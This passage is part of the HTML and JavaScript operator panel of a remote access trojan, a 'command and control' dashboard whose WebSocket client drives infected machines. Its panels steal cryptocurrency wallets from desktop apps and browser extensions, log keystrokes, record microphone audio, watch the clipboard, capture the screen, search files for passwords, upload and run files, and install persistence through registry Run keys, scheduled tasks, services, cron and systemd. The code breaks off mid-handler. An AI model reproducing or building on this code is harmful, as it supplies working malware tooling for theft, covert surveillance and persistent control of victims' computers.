            </div>
            <div class="command-input-container">
                <span class="prompt">RETRO@C2:~$</span>
                <input type="text" class="command-input" id="commandInput" placeholder="Enter command..." disabled>
                <button class="send-btn" id="sendBtn" disabled>EXECUTE</button>
            </div>
        </div>
        
        <div class="footer">
             RETRO COMMAND & CONTROL SYSTEM v1.0 
        </div>
    </div>


    <div class="modal-overlay" id="scriptModal">
        <div class="modal">
            <div class="modal-header">
                <div class="modal-title"> CUSTOM SCRIPT EXECUTION  <span id="scriptClientId"></span></div>
                <button class="modal-close" onclick="closeScriptModal()">CLOSE</button>
            </div>
            <div class="modal-body">
                <div class="script-container">
                    <div class="script-controls">
                        <select class="script-type-select" id="scriptType">
                            <option value="powershell">PowerShell</option>
                            <option value="batch">Batch</option>
                            <option value="vbscript">VBScript</option>
                        </select>
                        <button class="send-btn" onclick="executeCustomScript()">EXECUTE SCRIPT</button>
                    </div>
    
                    <div class="script-editor-container">
                        <textarea class="script-editor" id="scriptEditor" placeholder="Enter your script here..."></textarea>
                        <div class="script-output" id="scriptOutput"> SCRIPT OUTPUT </div>
                    </div>
                </div>
            </div>
        </div>
    </div>


<!-- Wallet Modal -->
<div class="modal-overlay" id="walletModal">
    <div class="modal">
        <div class="modal-header">
            <div class="modal-title"> WALLET SCANNER  <span id="walletClientId"></span></div>
            <button class="modal-close" onclick="closeWalletModal()">CLOSE</button>
        </div>
        <div class="modal-body">
            <div class="wallet-container">
                <div class="wallet-controls">
                    <button class="wallet-btn primary" id="scanWalletsBtn" onclick="startWalletScan()">
                         START SCAN 
                    </button>
                    <div class="scan-stats" id="scanStats">
                        <div class="stat-item">
                            <span class="stat-label">Found:</span>
                            <span class="stat-value" id="walletsFound">0</span>
                        </div>
                        <div class="stat-item">
                            <span class="stat-label">Downloaded:</span>
                            <span class="stat-value" id="walletsDownloaded">0</span>
                        </div>
                        <div class="stat-item">
                            <span class="stat-label">Status:</span>
                            <span class="stat-value" id="scanStatus">Ready</span>
                        </div>
                    </div>
                </div>
                
                <div class="wallet-info">
                    <div class="info-card">
                        <div class="info-title"> WHAT THIS SCANS </div>
                        <div class="info-content">
                            <div class="wallet-category">
                                <div class="category-title">Desktop Wallets</div>
                                <div class="wallet-list">
                                    Bitcoin Core  Ethereum  Electrum  Exodus  Atomic  Jaxx  Coinomi  Guarda
                                </div>
                            </div>
                            <div class="wallet-category">
                                <div class="category-title">Browser Extensions</div>
                                <div class="wallet-list">
                                    MetaMask  Binance  Coinbase  TronLink  Phantom  Trust  Ronin  Yoroi  Nami
                                </div>
                            </div>
                            <div class="wallet-category">
                                <div class="category-title">Browsers Checked</div>
                                <div class="wallet-list">
                                    Chrome  Brave  Edge  Firefox  Opera
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="wallet-results">
                    <div class="results-header"> SCAN RESULTS </div>
                    <div class="results-filter">
                        <button class="filter-btn active" onclick="filterWallets('all')">ALL</button>
                        <button class="filter-btn" onclick="filterWallets('desktop')">DESKTOP</button>
                        <button class="filter-btn" onclick="filterWallets('extension')">EXTENSIONS</button>
                        <button class="filter-btn" onclick="filterWallets('downloaded')">DOWNLOADED</button>
                    </div>
                    <div class="results-list" id="walletResults">
                        <div class="no-results">No scan performed yet</div>
                    </div>
                </div>
                
                <div class="wallet-download-progress" id="walletDownloadProgress" style="display: none;">
                    <div class="download-info">
                        <span>Downloading: <span id="downloadingWallet"></span></span>
                        <span id="downloadProgress">0%</span>
                    </div>
                    <div class="progress-bar-container">
                        <div class="progress-bar" id="walletProgressBar"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Troll Panel Modal -->
<div class="modal-overlay" id="trollModal">
    <div class="modal">
        <div class="modal-header">
            <div class="modal-title"> TROLL PANEL  <span id="trollClientId"></span></div>
            <button class="modal-close" onclick="closeTrollModal()">CLOSE</button>
        </div>
        <div class="modal-body">
            <div class="troll-container">
                <!-- Message Box -->
                <div class="troll-card">
                    <div class="troll-card-header"> SHOW MESSAGE BOX </div>
                    <div class="troll-card-body">
                        <input type="text" id="trollMsgTitle" placeholder="Message Title">
                        <textarea id="trollMsgText" placeholder="Message Text"></textarea>
                        <button class="troll-btn" onclick="sendTroll('messagebox')">SHOW MESSAGE</button>
                    </div>
                </div>

                <!-- Open URL -->
                <div class="troll-card">
                    <div class="troll-card-header"> OPEN URL </div>
                    <div class="troll-card-body">
                        <input type="text" id="trollUrl" placeholder="https://example.com">
                        <button class="troll-btn" onclick="sendTroll('open_url')">OPEN URL</button>
                    </div>
                </div>
                
                <!-- Text-to-Speech -->
                <div class="troll-card">
                    <div class="troll-card-header"> TEXT-TO-SPEECH </div>
                    <div class="troll-card-body">
                        <textarea id="trollTtsText" placeholder="Text to speak..."></textarea>
                        <button class="troll-btn" onclick="sendTroll('tts')">SPEAK</button>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- System Info Modal -->
<div class="modal-overlay" id="sysInfoModal">
    <div class="modal">
        <div class="modal-header">
            <div class="modal-title"> SYSTEM INFORMATION  <span id="sysInfoClientId"></span></div>
            <button class="modal-close" onclick="closeSysInfoModal()">CLOSE</button>
        </div>
        <div class="modal-body">
            <div class="sysinfo-container">
                <div class="sysinfo-tabs">
                    <button class="sysinfo-tab active" onclick="switchSysInfoTab('general')">GENERAL</button>
                    <button class="sysinfo-tab" onclick="switchSysInfoTab('hardware')">HARDWARE</button>
                    <button class="sysinfo-tab" onclick="switchSysInfoTab('software')">SOFTWARE</button>
                    <button class="sysinfo-tab" onclick="switchSysInfoTab('network')">NETWORK</button>
                </div>

                <div class="sysinfo-panel" id="sysInfoContent">
                    <div class="loading">Loading system information...</div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- PersistenceModal -->
<div class="modal-overlay" id="persistenceModal">
    <div class="modal">
        <div class="modal-header">
            <div class="modal-title"> PERSISTENCE MANAGEMENT  <span id="persistenceClientId"></span></div>
            <button class="modal-close" onclick="closePersistenceModal()">CLOSE</button>
        </div>
        <div class="modal-body">
            <div class="persistence-container">
                <div class="persistence-status-section">
                    <div class="status-card">
                        <div class="status-card-header"> CURRENT STATUS </div>
                        <div class="status-card-body">
                            <div class="persistence-main-status">
                                <span class="status-indicator" id="persistenceIndicator"></span>
                                <span id="persistenceMainStatus">Checking...</span>
                            </div>
                            <div class="installed-methods" id="installedMethods">
                                <!-- Methods will be listed here -->
                            </div>
                        </div>
                        <button class="persistence-btn" onclick="checkPersistence()">REFRESH STATUS</button>
                    </div>
                </div>
                
                <div class="persistence-methods">
                    <div class="methods-header"> AVAILABLE METHODS </div>
                    
                    <!-- Windows Methods -->
                    <div class="method-group" id="windowsMethods">
                        <div class="method-group-title">Windows Methods</div>
                        
                        <div class="method-card">
                            <div class="method-info">
                                <div class="method-name">Registry Run Key</div>
                                <div class="method-desc">Adds to HKCU\...\Run registry</div>
                            </div>
                            <button class="method-btn" onclick="installPersistence('registry')">INSTALL</button>
                        </div>
                        
                        <div class="method-card">
                            <div class="method-info">
                                <div class="method-name">Startup Folder</div>
                                <div class="method-desc">Copies to Windows startup folder</div>
                            </div>
                            <button class="method-btn" onclick="installPersistence('startup_folder')">INSTALL</button>
                        </div>
                        
                        <div class="method-card">
                            <div class="method-info">
                                <div class="method-name">Scheduled Task</div>
                                <div class="method-desc">Creates Windows scheduled task</div>
                            </div>
                            <button class="method-btn" onclick="installPersistence('scheduled_task')">INSTALL</button>
                        </div>
                        
                        <div class="method-card">
                            <div class="method-info">
                                <div class="method-name">Windows Service</div>
                                <div class="method-desc">Installs as system service (Admin)</div>
                            </div>
                            <button class="method-btn admin" onclick="installPersistence('service')">INSTALL</button>
                        </div>
                    </div>
                    
                    <!-- Linux Methods -->
                    <div class="method-group" id="linuxMethods" style="display: none;">
                        <div class="method-group-title">Linux Methods</div>
                        
                        <div class="method-card">
                            <div class="method-info">
                                <div class="method-name">Cron Job</div>
                                <div class="method-desc">Adds @reboot cron entry</div>
                            </div>
                            <button class="method-btn" onclick="installPersistence('cron')">INSTALL</button>
                        </div>
                        
                        <div class="method-card">
                            <div class="method-info">
                                <div class="method-name">Systemd Service</div>
                                <div class="method-desc">Creates systemd user service</div>
                            </div>
                            <button class="method-btn" onclick="installPersistence('systemd')">INSTALL</button>
                        </div>
                        
                        <div class="method-card">
                            <div class="method-info">
                                <div class="method-name">Desktop Autostart</div>
                                <div class="method-desc">Creates .desktop autostart file</div>
                            </div>
                            <button class="method-btn" onclick="installPersistence('desktop')">INSTALL</button>
                        </div>
                    </div>
                </div>
                
                <div class="persistence-actions">
                    <button class="persistence-btn danger" onclick="removeAllPersistence()">
                         REMOVE ALL PERSISTENCE 
                    </button>
                </div>
                
                <div class="persistence-log">
                    <div class="log-header"> OPERATION LOG </div>
                    <div class="log-content" id="persistenceLog"></div>
                </div>
            </div>
        </div>
    </div>
</div>

 <!-- Audio Modal -->
<div class="modal-overlay" id="audioModal">
    <div class="modal">
        <div class="modal-header">
            <div class="modal-title"> AUDIO RECORDING  <span id="audioClientId"></span></div>
            <button class="modal-close" onclick="closeAudioModal()">CLOSE</button>
        </div>
        <div class="modal-body">
            <div class="audio-container">
                <div class="audio-controls">
                    <div class="audio-device-section">
                        <label>Audio Device:</label>
                        <select class="audio-device-select" id="audioDeviceSelect">
                            <option value="0">Default Microphone</option>
                        </select>
                        <button class="audio-btn" onclick="refreshAudioDevices()">REFRESH</button>
                    </div>
                    
                    <div class="audio-duration-section">
                        <label>Duration (seconds):</label>
                        <input type="number" id="audioDuration" value="30" min="5" max="300">
                        <span class="duration-info">Max: 5 minutes</span>
                    </div>
                </div>
                
                <div class="audio-record-section">
                    <div class="record-visualizer" id="recordVisualizer">
                        <div class="visualizer-bar"></div>
                        <div class="visualizer-bar"></div>
                        <div class="visualizer-bar"></div>
                        <div class="visualizer-bar"></div>
                        <div class="visualizer-bar"></div>
                    </div>
                    
                    <div class="record-controls">
                        <button class="record-btn" id="recordBtn" onclick="toggleRecording()">
                            <span class="record-icon"></span>
                            <span id="recordBtnText">START RECORDING</span>
                        </button>
                        
                        <div class="record-status" id="recordStatus">
                            <span class="status-dot"></span>
                            <span id="recordStatusText">Ready</span>
                        </div>
                    </div>
                    
                    <div class="record-timer" id="recordTimer" style="display: none;">
                        <span class="timer-text">Recording: <span id="timerValue">00:00</span></span>
                        <div class="timer-bar-container">
                            <div class="timer-bar" id="timerBar"></div>
                        </div>
                    </div>
                </div>
                
                <div class="audio-recordings">
                    <div class="recordings-header"> RECORDED AUDIO FILES </div>
                    <div class="recordings-list" id="recordingsList">
                        <div class="no-recordings">No recordings yet</div>
                    </div>
                </div>
                
                <div class="audio-status" id="audioStatus">Ready to record</div>
            </div>
        </div>
    </div>
</div>




 <!-- Network Modal -->

<div class="modal-overlay" id="networkModal">
    <div class="modal">
        <div class="modal-header">
            <div class="modal-title"> NETWORK TOOLS  <span id="networkClientId"></span></div>
            <button class="modal-close" onclick="closeNetworkModal()">CLOSE</button>
        </div>
        <div class="modal-body">
            <div class="network-container">
                <div class="network-tabs">
                    <button class="network-tab active" onclick="switchNetworkTab('connections')">CONNECTIONS</button>
                    <button class="network-tab" onclick="switchNetworkTab('scanner')">PORT SCANNER</button>
                </div>
                
                <!-- Connections Tab -->
                <div class="network-panel" id="connectionsPanel">
                    <div class="connections-controls">
                        <button class="network-btn" onclick="refreshConnections()">REFRESH</button>
                        <button class="network-btn" id="netstatMonitorBtn" onclick="toggleNetstatMonitor()">START MONITOR</button>
                        <button class="network-btn danger" id="closeConnectionBtn" onclick="closeSelectedConnection()" disabled>CLOSE CONNECTION</button>
                        <div class="connection-filter">
                            <input type="text" id="connectionFilterInput" placeholder="Filter connections..." onkeyup="filterConnections(event)">
                        </div>
                    </div>
                    
                    <div class="connections-list-container">
                        <div class="connections-header">
                            <div>Protocol</div>
                            <div>Local Address</div>
                            <div>Remote Address</div>
                            <div>State</div>
                            <div>Process</div>
                        </div>
                        <div class="connections-list" id="connectionsList">
                            <div class="loading">Loading connections...</div>
                        </div>
                    </div>
                    
                    <div class="connections-status">
                        <div id="connectionsStatusText">Ready</div>
                        <div id="connectionsCount">0 connections</div>
                    </div>
                </div>
                
                <!-- Port Scanner Tab -->
                <div class="network-panel" id="scannerPanel" style="display: none;">
                    <div class="scanner-controls">
                        <div class="scanner-input-section">
                            <input type="text" id="scanTargetInput" placeholder="Target IP (e.g., 192.168.1.1)">
                            <input type="number" id="scanStartPort" placeholder="Start Port" value="1" min="1" max="65535">
                            <input type="number" id="scanEndPort" placeholder="End Port" value="1000" min="1" max="65535">
                            <button class="network-btn primary" id="startScanBtn" onclick="startPortScan()">START SCAN</button>
                            <button class="network-btn danger" id="stopScanBtn" onclick="stopPortScan()" disabled>STOP</button>
                        </div>
                        
                        <div class="scan-presets">
                            <button class="preset-btn" onclick="setScanPreset('common')">Common Ports</button>
                            <button class="preset-btn" onclick="setScanPreset('web')">Web Ports</button>
                            <button class="preset-btn" onclick="setScanPreset('full')">Full Range</button>
                        </div>
                    </div>
                    
                    <div class="scan-progress-section" id="scanProgressSection" style="display: none;">
                        <div class="scan-info">
                            <span>Scanning: <span id="scanTarget"></span></span>
                            <span>Progress: <span id="scanProgress">0%</span></span>
                        </div>
                        <div class="progress-bar-container">
                            <div class="progress-bar" id="scanProgressBar"></div>
                        </div>
                    </div>
                    
                    <div class="scan-results-container">
                        <div class="scan-results-header"> OPEN PORTS </div>
                        <div class="scan-results" id="scanResults">
                            <div class="no-results">No scan results yet</div>
                        </div>
                    </div>
                    
                    <div class="scanner-status" id="scannerStatus">Ready to scan</div>
                </div>
            </div>
        </div>
    </div>
</div>






    <!-- Registry Modal -->
    <div class="modal-overlay" id="registryModal">
    <div class="modal">
        <div class="modal-header">
            <div class="modal-title"> REGISTRY EDITOR  <span id="registryClientId"></span></div>
            <button class="modal-close" onclick="closeRegistryModal()">CLOSE</button>
        </div>
        <div class="modal-body">
            <div class="registry-container">
                <div class="registry-controls">
                    <div class="registry-path-section">
                        <select class="registry-hive-select" id="registryHiveSelect">
                            <option value="HKLM">HKEY_LOCAL_MACHINE</option>
                            <option value="HKCU">HKEY_CURRENT_USER</option>
                            <option value="HKCR">HKEY_CLASSES_ROOT</option>
                            <option value="HKU">HKEY_USERS</option>
                            <option value="HKCC">HKEY_CURRENT_CONFIG</option>
                        </select>
                        <input type="text" class="registry-path-input" id="registryPathInput" 
                               placeholder="Enter registry path (e.g., SOFTWARE\Microsoft\Windows)">
                        <button class="registry-btn" onclick="navigateRegistry()">GO</button>
                    </div>
                    
                    <div class="registry-action-section">
                        <button class="registry-btn" onclick="refreshRegistry()">REFRESH</button>
                        <button class="registry-btn" onclick="showAddValueDialog()">ADD VALUE</button>
                        <button class="registry-btn danger" id="deleteRegBtn" onclick="deleteRegistryItem()" disabled>DELETE</button>
                    </div>
                </div>
                
                <div class="registry-browser">
                    <div class="registry-tree">
                        <div class="tree-header"> REGISTRY KEYS </div>
                        <div class="tree-content" id="registryKeys">
                            <div class="loading">Loading keys...</div>
                        </div>
                    </div>
                    
                    <div class="registry-values">
                        <div class="values-header"> REGISTRY VALUES </div>
                        <div class="values-content" id="registryValues">
                            <div class="no-selection">Select a key to view values</div>
                        </div>
                    </div>
                </div>
                
                <div class="registry-status" id="registryStatus">Ready</div>
            </div>
            
            <!-- Add/Edit Value Dialog -->
            <div class="registry-dialog" id="addValueDialog" style="display: none;">
                <div class="dialog-content">
                    <h3>Add/Edit Registry Value</h3>
                    <input type="text" id="regValueName" placeholder="Value name">
                    <select id="regValueType">
                        <option value="REG_SZ">String (REG_SZ)</option>
                        <option value="REG_DWORD">DWORD (REG_DWORD)</option>
                        <option value="REG_BINARY">Binary (REG_BINARY)</option>
                        <option value="REG_MULTI_SZ">Multi-String (REG_MULTI_SZ)</option>
                        <option value="REG_EXPAND_SZ">Expandable String (REG_EXPAND_SZ)</option>
                    </select>
                    <textarea id="regValueData" placeholder="Value data"></textarea>
                    <div class="dialog-buttons">
                        <button class="registry-btn" onclick="saveRegistryValue()">SAVE</button>
                        <button class="registry-btn" onclick="hideAddValueDialog()">CANCEL</button>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

    <!-- Remote Desktop Modal -->
    <div class="modal-overlay" id="rdpModal">
        <div class="modal">
            <div class="modal-header">
                <div class="modal-title"> REMOTE DESKTOP  <span id="rdpClientId"></span></div>
                <button class="modal-close" onclick="closeRdpModal()">CLOSE</button>
            </div>
            <div class="modal-body">
                <div class="rdp-controls">
                    <button class="rdp-btn" id="rdpStartBtn" onclick="startRemoteDesktop()">START</button>
                    <button class="rdp-btn stop" id="rdpStopBtn" onclick="stopRemoteDesktop()" disabled>STOP</button>
                    
                    <div class="quality-selector">
                        <label>QUALITY:</label>
                        <select id="rdpQuality" onchange="changeQuality()">
                            <option value="low">LOW (Fast)</option>
                            <option value="medium" selected>MEDIUM</option>
                            <option value="high">HIGH (Slow)</option>
                        </select>
                    </div>
                    
                    <div class="rdp-status disconnected" id="rdpStatus">DISCONNECTED</div>
                </div>
                
                <div class="screen-container">
                    <div class="screen-placeholder" id="screenPlaceholder">
                         REMOTE DESKTOP VIEWER <br>
                        Click START to begin screen capture
                    </div>
                    <img class="screen-image" id="screenImage" style="display: none;" />
                    <div class="fps-counter" id="fpsCounter" style="display: none;">FPS: 0</div>
                </div>
            </div>
        </div>
    </div>

    <!-- Remote Execute Modal -->
    <div class="modal-overlay" id="execModal">
        <div class="modal">
            <div class="modal-header">
                <div class="modal-title"> REMOTE EXECUTE  <span id="execClientId"></span></div>
                <button class="modal-close" onclick="closeExecModal()">CLOSE</button>
            </div>
            <div class="modal-body">
                <div class="exec-controls">
                    <div class="file-upload-section">
                        <div class="file-input-wrapper">
                            <label for="fileInput" class="file-input-label">
                                 SELECT FILE 
                            </label>
                            <input type="file" id="fileInput" accept="*" onchange="handleFileSelect(event)">
                        </div>
                        <div class="file-info" id="fileInfo">No file selected (Max: 50MB)</div>
                    </div>
                    
                    <div class="progress-section" id="progressSection">
                        <div class="progress-bar-container">
                            <div class="progress-bar" id="progressBar"></div>
                            <div class="progress-text" id="progressText">0%</div>
                        </div>
                    </div>
                    
                    <button class="exec-btn" id="uploadBtn" onclick="uploadFile()" disabled>
                         UPLOAD FILE 
                    </button>
                    
                    <button class="exec-btn danger" id="executeBtn" onclick="executeFile()" disabled>
                         EXECUTE 
                    </button>
                </div>
                
                <div class="exec-output" id="execOutput">
                     EXECUTION OUTPUT 
                    
                    Ready to upload and execute files...
                </div>
            </div>
        </div>
    </div>

    <!-- File Manager Modal -->
    <div class="modal-overlay" id="fmModal">
        <div class="modal">
            <div class="modal-header">
                <div class="modal-title"> FILE MANAGER  <span id="fmClientId"></span></div>
                <button class="modal-close" onclick="closeFmModal()">CLOSE</button>
            </div>
            <div class="modal-body">
                <div class="fm-container">
                    <div class="fm-controls">
                        <div class="fm-path-section">
                            <select class="fm-drive-select" id="fmDriveSelect" onchange="changeDrive()">
                                <option value="C:">C:</option>
                            </select>
                            <input type="text" class="fm-path-input" id="fmPathInput" placeholder="Enter path..." onkeypress="handlePathKeypress(event)">
                            <button class="fm-btn" onclick="navigateToPath()">GO</button>
                            <button class="fm-btn" onclick="navigateUp()"> UP </button>
                            <button class="fm-btn" onclick="refreshFiles()">REFRESH</button>
                        </div>
                        
                        <div class="fm-action-section">
                            <button class="fm-btn" id="fmExecuteBtn" onclick="executeSelected()" disabled>EXECUTE</button>
                            <button class="fm-btn" id="fmZipBtn" onclick="zipCurrent()" disabled>ZIP SELECTED</button>
                            <button class="fm-btn" id="fmDownloadBtn" onclick="downloadSelected()" disabled>DOWNLOAD</button>
                            <div class="file-input-wrapper">
                                <label for="fmFileInput" class="fm-btn">
                                    UPLOAD HERE
                                </label>
                                <input type="file" id="fmFileInput" accept="*" onchange="handleFmFileSelect(event)" style="display: none;">
                            </div>
                        </div>
                    </div>

                    <div class="fm-search-section">
                        <input type="text" class="fm-search-input" id="fmSearchInput" placeholder="Search pattern (e.g., *.txt, *pass*)">
                        <button class="fm-btn" onclick="searchFiles()">SEARCH</button>
                        <button class="fm-btn" onclick="stopSearch()" id="fmStopSearchBtn" style="display: none;">STOP</button>
                    </div>
                    
                    <div class="fm-browser">
                        <div class="fm-header">
                            <div>Type</div>
                            <div>Name</div>
                            <div>Size</div>
                            <div>Modified</div>
                            <div>Extension</div>
                        </div>
                        <div class="fm-files" id="fmFiles">
                            <!-- Files will be populated here -->
                        </div>
                    </div>
                    
                    <div class="fm-status">
                        <div id="fmStatusText">Ready</div>
                        <div id="fmSelectedInfo">No selection</div>
                    </div>
                </div>
                
                <!-- Progress Modal for downloads/uploads -->
                <div class="fm-progress-modal" id="fmProgressModal">
                    <div class="fm-progress-title" id="fmProgressTitle">Processing...</div>
                    <div class="fm-progress-info" id="fmProgressInfo"></div>
                    <div class="progress-bar-container">
                        <div class="progress-bar" id="fmProgressBar"></div>
                        <div class="progress-text" id="fmProgressText">0%</div>
                    </div>
                </div>
            </div>
        </div>
    </div>


<div class="modal-overlay" id="processModal">
    <div class="modal">
        <div class="modal-header">
            <div class="modal-title"> PROCESS MANAGER  <span id="processClientId"></span></div>
            <button class="modal-close" onclick="closeProcessModal()">CLOSE</button>
        </div>
        <div class="modal-body">
            <div class="process-container">
                <div class="process-controls">
                    <div class="process-search-section">
                        <input type="text" class="process-search-input" id="processSearchInput" 
                               placeholder="Search processes..." onkeyup="searchProcesses(event)">
                        <button class="process-btn" onclick="refreshProcesses()">REFRESH</button>
                        <button class="process-btn" onclick="showStartProcessDialog()">START NEW</button>
                    </div>
                    
                    <div class="process-action-section">
                        <button class="process-btn danger" id="killProcessBtn" onclick="killSelectedProcess()" disabled>KILL</button>
                        <select class="process-priority-select" id="processPrioritySelect" onchange="setProcessPriority()" disabled>
                            <option value="">Set Priority</option>
                            <option value="low">Low</option>
                            <option value="normal">Normal</option>
                            <option value="high">High</option>
                            <option value="realtime">Realtime</option>
                        </select>
                        <button class="process-btn" id="processDetailsBtn" onclick="getProcessDetails()" disabled>DETAILS</button>
                    </div>
                </div>
                
                <div class="process-list-container">
                    <div class="process-header">
                        <div>PID</div>
                        <div>Name</div>
                        <div>Memory</div>
                        <div>Threads</div>
                    </div>
                    <div class="process-list" id="processList">
                        <div class="loading">Loading processes...</div>
                    </div>
                </div>
                
                <div class="process-status">
                    <div id="processStatusText">Ready</div>
                    <div id="processCount">0 processes</div>
                </div>
            </div>
            
            <!-- Start Process Dialog -->
            <div class="process-dialog" id="startProcessDialog" style="display: none;">
                <div class="dialog-content">
                    <h3>Start New Process</h3>
                    <input type="text" id="processPathInput" placeholder="Path to executable (e.g., C:\Windows\notepad.exe)">
                    <input type="text" id="processArgsInput" placeholder="Arguments (optional)">
                    <div class="dialog-buttons">
                        <button class="process-btn" onclick="startNewProcess()">START</button>
                        <button class="process-btn" onclick="hideStartProcessDialog()">CANCEL</button>
                    </div>
                </div>
            </div>
            
            <!-- Process Details Dialog -->
            <div class="process-dialog" id="processDetailsDialog" style="display: none;">
                <div class="dialog-content">
                    <h3>Process Details</h3>
                    <div id="processDetailsContent"></div>
                    <button class="process-btn" onclick="hideProcessDetails()">CLOSE</button>
                </div>
            </div>
        </div>
    </div>
</div>


<div class="modal-overlay" id="clipboardModal">
    <div class="modal">
        <div class="modal-header">
            <div class="modal-title"> CLIPBOARD MANAGER  <span id="clipboardClientId"></span></div>
            <button class="modal-close" onclick="closeClipboardModal()">CLOSE</button>
        </div>
        <div class="modal-body">
            <div class="clipboard-container">
                <div class="clipboard-controls">
                    <button class="clipboard-btn" onclick="getClipboard()">GET CLIPBOARD</button>
                    <button class="clipboard-btn" onclick="clearClipboardInput()">CLEAR</button>
                    <button class="clipboard-btn" id="clipboardMonitorBtn" onclick="toggleClipboardMonitor()">START MONITOR</button>
                </div>
                
                <div class="clipboard-input-section">
                    <textarea id="clipboardInput" placeholder="Enter text to set clipboard or view current clipboard content..."></textarea>
                    <button class="clipboard-btn primary" onclick="setClipboard()">SET CLIPBOARD</button>
                </div>
                
                <div class="clipboard-history">
                    <div class="history-header"> CLIPBOARD HISTORY </div>
                    <div class="history-list" id="clipboardHistory"></div>
                </div>
            </div>
        </div>
    </div>
</div>



<div class="modal-overlay" id="keyloggerModal">
    <div class="modal">
        <div class="modal-header">
            <div class="modal-title"> KEYLOGGER  <span id="keyloggerClientId"></span></div>
            <button class="modal-close" onclick="closeKeyloggerModal()">CLOSE</button>
        </div>
        <div class="modal-body">
            <div class="keylogger-container">
                <div class="keylogger-controls">
                    <button class="keylogger-btn" id="keyloggerStartBtn" onclick="toggleKeylogger()">START LOGGING</button>
                    <button class="keylogger-btn" onclick="getKeylog()">GET LOG</button>
                    <button class="keylogger-btn" onclick="clearKeylog()">CLEAR LOG</button>
                    <button class="keylogger-btn" onclick="exportKeylog()">EXPORT</button>
                    <div class="keylogger-status" id="keyloggerStatus">
                        <span class="status-indicator inactive"></span>
                        <span id="keyloggerStatusText">INACTIVE</span>
                    </div>
                </div>
                
                <div class="keylog-display">
                    <div class="keylog-header">
                        <span> CAPTURED KEYSTROKES </span>
                        <span id="keylogSize">0 bytes</span>
                    </div>
                    <div class="keylog-content" id="keylogContent">
                        No keystrokes captured yet...
                    </div>
                </div>
                
                <div class="keylog-stats">
                    <div>Total Characters: <span id="keylogChars">0</span></div>
                    <div>Words: <span id="keylogWords">0</span></div>
                    <div>Lines: <span id="keylogLines">0</span></div>
                    <div>Last Update: <span id="keylogLastUpdate">Never</span></div>
                </div>
            </div>
        </div>
    </div>
</div>


    <script>
        class AveryC2 {
            constructor() {
                this.ws = null;
                this.selectedClient = null;
                this.clients = new Map();
                this.rdpActive = false;
                this.rdpInterval = null;
                this.fpsCounter = 0;
                this.lastFpsUpdate = Date.now();
                this.selectedFile = null;
                this.uploadedFileName = null;
                // File Manager - improved download handling
                this.currentPath = 'C:\\';
                this.selectedFmFile = null;
                this.fileList = [];
                this.downloadChunks = new Map(); // Use Map for better chunk management
                this.downloadFileName = '';
                this.downloadTotalChunks = 0;
                this.downloadExpectedSize = 0;
                this.init();
            }
            
            init() {
                this.connectWebSocket();
                this.setupEventListeners();
            }
            
            connectWebSocket() {
                const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
                this.ws = new WebSocket(`${protocol}//${window.location.host}/ws`);
                
                this.ws.onopen = () => {
                    this.updateStatus('CONNECTED', true);
                    this.addTerminalOutput('>>> CONNECTED TO SERVER', 'system');
                };
                
                this.ws.onclose = () => {
                    this.updateStatus('DISCONNECTED', false);
                    this.addTerminalOutput('>>> CONNECTION LOST - RETRYING...', 'error');
                    setTimeout(() => this.connectWebSocket(), 3000);
                };
                
                this.ws.onmessage = (event) => {
                    const data = JSON.parse(event.data);
                    this.handleMessage(data);
                };
                
                this.ws.onerror = (error) => {
                    console.error('WebSocket error:', error);
                    this.addTerminalOutput('>>> WEBSOCKET ERROR', 'error');
                };
            }
            
            handleMessage(data) {
                switch (data.type) {
                    case 'clients_list':
                    case 'clients_update':
                        this.updateClientsList(data.clients);
                        break;
                    case 'command_response':
                        this.handleCommandResponse(data);
                        break;
                    case 'command_sent':
                        if (!data.success) {
                            this.addTerminalOutput(`>>> ERROR: ${data.data}`, 'error');
                        }
                        break;

                        case 'wallet_scan_started':
    this.handleWalletScanStarted();
    break;
case 'wallet_found':
    this.handleWalletFound(data);
    break;
case 'wallet_scan_complete':
    this.handleWalletScanComplete(data);
    break;
case 'wallet_download_start':
    this.handleWalletDownloadStart(data);
    break;
case 'wallet_download_chunk':
    this.handleWalletDownloadChunk(data);
    break;
case 'wallet_download_complete':
    this.handleWalletDownloadComplete(data);
    break;
case 'troll_response':
    this.handleTrollResponse(data);
    break;
case 'sysinfo_response':
    this.handleSysInfoResponse(data);
    break;
case 'script_response':
    this.handleScriptResponse(data);
    break;
case 'password_recovery_complete':
    this.handlePasswordRecoveryComplete(data);
    break;


                        case 'persistence_status':
    this.handlePersistenceStatus(data);
    break;
case 'persistence_result':
    this.handlePersistenceResult(data);
    break;

case 'audio_devices':
    this.handleAudioDevices(data);
    break;
case 'audio_record_started':
    this.handleAudioRecordStarted(data);
    break;
case 'audio_record_progress':
    this.handleAudioRecordProgress(data);
    break;
case 'audio_record_error':
    this.handleAudioRecordError(data);
    break;
case 'audio_file_start':
    this.handleAudioFileStart(data);
    break;
case 'audio_file_chunk':
    this.handleAudioFileChunk(data);
    break;
case 'audio_record_complete':
    this.handleAudioRecordComplete(data);
    break;

case 'connections_list':
    this.handleConnectionsList(data);
    break;
case 'connection_close_result':
    this.handleConnectionCloseResult(data);
    break;
case 'netstat_monitor_status':
    // Auto refresh handled
    break;
case 'port_scan_started':
    this.handlePortScanStarted(data);
    break;
case 'port_scan_progress':
    this.handlePortScanProgress(data);
    break;
case 'port_found':
    this.handlePortFound(data);
    break;
case 'port_scan_complete':
    this.handlePortScanComplete(data);
    break;

                        case 'registry_keys_list':
    this.handleRegistryKeysList(data);
    break;
case 'registry_values_list':
    this.handleRegistryValuesList(data);
    break;
case 'registry_read_result':
    this.handleRegistryReadResult(data);
    break;
case 'registry_write_result':
    this.handleRegistryWriteResult(data);
    break;
case 'registry_delete_result':
    this.handleRegistryDeleteResult(data);
    break;
case 'registry_error':
    this.handleRegistryError(data);
    break;
                        case 'keylogger_status':
    this.handleKeyloggerStatus(data);
    break;
case 'keylog_data':
    this.handleKeylogData(data);
    break;
case 'keylog_update':
    this.handleKeylogUpdate(data);
    break;
case 'keylog_clear':
    this.handleKeylogClear(data);
    break;
case 'clipboard_data':
    this.handleClipboardData(data);
    break;
case 'clipboard_set_result':
    this.handleClipboardSetResult(data);
    break;
case 'clipboard_monitor_status':
    // Monitor status handled by toggle function
    break;
case 'clipboard_changed':
    this.handleClipboardChanged(data);
    break;

